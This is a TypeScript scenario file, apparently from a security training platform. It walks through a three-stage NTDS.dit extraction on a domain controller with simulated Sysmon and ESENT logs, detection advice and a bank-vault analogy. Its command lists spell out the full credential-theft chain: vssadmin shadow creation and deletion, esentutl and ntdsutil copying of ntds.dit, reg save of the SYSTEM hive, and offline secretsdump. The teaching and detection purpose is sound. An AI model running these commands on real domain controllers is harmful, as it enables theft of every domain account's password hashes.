import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-ntds-dit-vssadmin-esentutl-extraction',
    title: 'CISA & Microsoft DFIR — Volume Shadow Copy & esentutl.exe NTDS.dit Extraction Forensics',
    category: 'ACTIVE_DIRECTORY',
    mitreId: 'T1003.003',
    description:
      'Grounded in CISA Advisory AA23-075A, Microsoft ESENT Event Logging documentation, and MITRE ATT&CK T1003.003: an adversary with Domain Admin privileges creates a Volume Shadow Copy of C: on a Domain Controller via vssadmin.exe or ntdsutil.exe, copies the locked Active Directory database (C:\\Windows\\NTDS\\ntds.dit) using esentutl.exe /y /vss, and extracts the SYSTEM registry hive for offline password hash cracking.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Compromised Admin Jump Host', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Core DC VLAN Switch (:445)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CORP-DC01 (vssvc & esentutl)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Windows Event & ESENT SIEM', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'NTDS.dit & SYSTEM Hive Store', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Volume Shadow Copy Creation via vssadmin.exe & vssvc.exe (EventID 1 & 7036)',
        narration:
          'Because the Active Directory Extensible Storage Engine database (C:\\Windows\\NTDS\\ntds.dit) is exclusively locked by lsass.exe while the Domain Controller is running, the attacker spawns vssadmin.exe create shadow /for=C: to instruct the Volume Shadow Copy Service (VSS) to snapshot the C: volume into \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Credential Access (T1003.003 - OS Credential Dumping: NTDS)',
        technicalCommands: [
          'vssadmin.exe create shadow /for=C:',
          'sc.exe query vss  # System EventID 7036: Volume Shadow Copy service entered the running state',
          'Shadow Copy Device Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
        ],
        defenseMitigation:
          'Alert on Sysmon EventID 1 / Security EventID 4688 for vssadmin.exe, diskshadow.exe, or wmic shadowcopy call create on Domain Controllers outside scheduled backup windows.',
        logs: [
          {
            id: 'dfir-ntds-1',
            timestamp: '02:11:04.210',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'vssadmin.exe',
            CommandLine: 'vssadmin.exe create shadow /for=C:',
            raw: 'EventID: 1 | Computer: CORP-DC01.corp.local | Image: C:\\Windows\\System32\\vssadmin.exe | CommandLine: vssadmin.exe create shadow /for=C: | ParentImage: C:\\Windows\\System32\\cmd.exe | Correlated System EventID 7036: The Volume Shadow Copy service entered the running state.',
            parsedFields: {
              EventID: '1 (Sysmon) / 7036 (System SCM)',
              Image: 'C:\\Windows\\System32\\vssadmin.exe',
              ShadowVolume: '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
              TargetDatabase: 'C:\\Windows\\NTDS\\ntds.dit',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: ESENT Database Streaming via esentutl.exe /y /vss (Application ESENT EventID 325 & 326)',
        narration:
          'The attacker invokes the signed Microsoft Extensible Storage Engine utility (esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Temp\\ntds.dit) or ntdsutil.exe "ac i ntds" "ifm". Even if command-line logs are evaded, the Windows Application log records ESENT EventID 325 (New database created: C:\\Temp\\ntds.dit) and EventID 326/327 (Database engine attached/detached).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.003 - ESENT EventID 325/326 Artifact)',
        technicalCommands: [
          'esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit',
          'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\IFM" q q',
          'Application Log Provider: ESENT EventID 325 (New database C:\\Windows\\Temp\\ntds.dit created)',
        ],
        defenseMitigation:
          'Forward Windows Application EventLog Provider="ESENT" (Event IDs 216, 325, 326, 327) to the SIEM and trigger high-priority alerts whenever a path containing ntds.dit is created outside C:\\Windows\\NTDS\\.',
        logs: [
          {
            id: 'dfir-ntds-2',
            timestamp: '02:11:09.840',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 325,
            ProcessName: 'esentutl.exe',
            CommandLine: 'esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit',
            raw: 'LogName: Application | Source: ESENT | EventID: 325 | Level: Information | Description: esentutl (4912,D,0) The database engine created a new database (0, C:\\Windows\\Temp\\ntds.dit). | Correlated ESENT EventID 326: Database engine attached database C:\\Windows\\Temp\\ntds.dit.',
            parsedFields: {
              Provider: 'ESENT (Application Event Log)',
              EventID: '325 (Database Created) / 326 (Database Attached)',
              SourceDatabase: 'C:\\Windows\\NTDS\\ntds.dit',
              StagedDatabasePath: 'C:\\Windows\\Temp\\ntds.dit',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SYSTEM Registry Hive BootKey Extraction (reg.exe save HKLM\\SYSTEM) & Offline SecretsDump',
        narration:
          'Because ntds.dit PekList password hashes are encrypted with the Domain Controller BootKey stored across four scrambled registry keys (JD, Skew1, GBG, Data under HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa), the attacker runs reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv and exfiltrates both files to run Impacket secretsdump.py offline.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1003.002 - Security Account Manager / SYSTEM BootKey)',
        technicalCommands: [
          'reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y',
          'vssadmin.exe delete shadows /for=C: /quiet',
          'secretsdump.py -ntds ntds.dit -system sys.hiv LOCAL',
        ],
        defenseMitigation:
          'Monitor Sysmon EventID 11 (FileCreate) and EventID 13 (RegistryEvent) alongside command-line invocations of reg.exe save targeting HKLM\\SYSTEM or HKLM\\SAM.',
        logs: [
          {
            id: 'dfir-ntds-3',
            timestamp: '02:11:15.302',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\reg.exe | TargetFilename: C:\\Windows\\Temp\\sys.hiv | Correlated EventID 1: reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y | BootKey Classes: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\{JD,Skew1,GBG,Data}',
            parsedFields: {
              EventID: '11 (Sysmon FileCreate) / 4688 (Security)',
              Image: 'C:\\Windows\\System32\\reg.exe',
              TargetFilename: 'C:\\Windows\\Temp\\sys.hiv',
              ForensicImpact: 'Offline decryption of all AD user & krbtgt NTLM/AES keys',
            },
          },
        ],
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a bank whose master account ledger stays bolted down to the vault floor while the bank is open so nobody can walk out with it. An intruder snaps a frozen carbon-copy photograph of the entire floor, uses the bank own official bookbinding copier to stream the ledger cleanly out of the frozen photograph, and separately steals the four-part decoder dial from the wall safe so they can read every password seal offline.',
      storyMappings: [
        {
          storyTerm: 'Snapping a frozen carbon-copy photograph of the vault floor',
          technicalTerm: 'Creating a Volume Shadow Copy via vssadmin.exe and vssvc.exe (EventID 1 & 7036)',
          tone: 'amber',
        },
        {
          storyTerm: 'Official bookbinding copier streaming the ledger out of the photo',
          technicalTerm: 'esentutl.exe /y /vss copying locked ntds.dit (ESENT EventID 325 / 326)',
          tone: 'sky',
        },
        {
          storyTerm: 'Four-part decoder dial stolen from the wall safe',
          technicalTerm: 'reg.exe save HKLM\\SYSTEM capturing the BootKey across four scrambled registry keys',
          tone: 'rose',
        },
        {
          storyTerm: 'Reading every password seal offline in a hideout',
          technicalTerm: 'Offline secretsdump.py decryption of ntds.dit PekList NTLM hashes',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Unable to pry the live master ledger off the vault desk while clerks are using it, the intruder activates the building built-in instant camera to capture a frozen read-only snapshot of the entire drive floor.',
        storyMappings: [
          {
            storyTerm: 'Live ledger bolted to the vault desk',
            technicalTerm: 'Exclusively locked C:\\Windows\\NTDS\\ntds.dit held open by lsass.exe',
            tone: 'amber',
          },
          {
            storyTerm: 'Activating the building built-in instant camera',
            technicalTerm: 'Running vssadmin.exe create shadow /for=C: triggering vssvc.exe',
            tone: 'sky',
          },
          {
            storyTerm: 'Frozen read-only snapshot of the floor',
            technicalTerm: 'Newly mounted Volume Shadow Copy device (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1)',
            tone: 'rose',
          },
          {
            storyTerm: 'Building security log noting the camera flash',
            technicalTerm: 'Sysmon EventID 1 and System EventID 7036 (Volume Shadow Copy service started)',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'Stepping up to the frozen floor photograph, the intruder calls over the bank own signed book-repair utility to peel a clean copy of the master ledger right out of the snapshot while the database engine quietly stamps an internal audit ticket.',
        storyMappings: [
          {
            storyTerm: 'Bank own signed book-repair utility',
            technicalTerm: 'Native Windows Extensible Storage Engine utility esentutl.exe /y /vss',
            tone: 'amber',
          },
          {
            storyTerm: 'Peeling a clean copy out of the frozen snapshot',
            technicalTerm: 'Streaming ntds.dit from the shadow copy path into a staging folder',
            tone: 'sky',
          },
          {
            storyTerm: 'Internal audit ticket stamped by the database engine',
            technicalTerm: 'Application ESENT EventID 325 and 326 logging database attachment and copy',
            tone: 'rose',
          },
          {
            storyTerm: 'Staging folder holding the copied ledger',
            technicalTerm: 'Exfiltration staging directory such as C:\\Temp\\ntds.dit',
            tone: 'emerald',
          },
        ],
      },
      3: {
        storyAnalogy:
          'Because every password line inside the stolen ledger is scrambled by a secret master cipher wheel bolted inside the wall cabinet, the intruder also exports that entire system cabinet so they can unwind every employee secret offline without touching the bank again.',
        storyMappings: [
          {
            storyTerm: 'Secret master cipher wheel inside the wall cabinet',
            technicalTerm: 'Domain Controller BootKey scrambled across four keys in HKLM\\SYSTEM',
            tone: 'amber',
          },
          {
            storyTerm: 'Exporting the entire system cabinet',
            technicalTerm: 'reg.exe save HKLM\\SYSTEM C:\\Temp\\SYSTEM.hiv',
            tone: 'sky',
          },
          {
            storyTerm: 'Scrambled password lines inside the ledger',
            technicalTerm: 'Encrypted PekList entries storing every domain NTLM and Kerberos key',
            tone: 'rose',
          },
          {
            storyTerm: 'Unwinding every employee secret offline',
            technicalTerm: 'Offline credential extraction combining ntds.dit and SYSTEM.hiv via secretsdump',
            tone: 'emerald',
          },
        ],
      },
    },
  };
